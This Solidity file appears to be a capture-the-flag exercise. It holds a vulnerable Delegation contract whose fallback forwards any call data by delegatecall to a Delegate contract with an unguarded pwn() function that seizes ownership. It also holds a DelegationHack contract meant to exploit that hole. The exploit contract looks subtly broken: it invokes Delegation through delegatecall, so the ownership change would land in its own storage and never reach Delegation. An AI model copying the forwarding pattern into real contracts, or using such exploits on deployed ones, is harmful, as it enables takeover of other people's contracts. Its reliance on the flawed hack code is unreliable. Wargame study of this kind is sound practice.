// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;
  event PwnBefore(address owner, address sender);
  event PwnAfter(address owner, address sender);


  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    emit PwnBefore(owner, msg.sender);
    owner = msg.sender;
    emit PwnAfter(owner, msg.sender);
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;
  // Delegation delegation;
  event Fallback(bytes data, address sender);

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    emit Fallback(msg.data, msg.sender);
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}

contract DelegationHack{
    address public owner;
    Delegate delegate;
    Delegation delegation;

    constructor(Delegation _delegation, Delegate _delegate) public{
        delegation = _delegation;
        delegate = _delegate;
    }

    function hack() public returns(bool) {
        (bool res, ) = address(delegation).delegatecall(abi.encodeWithSignature("pwn()"));
        return res;
    }
}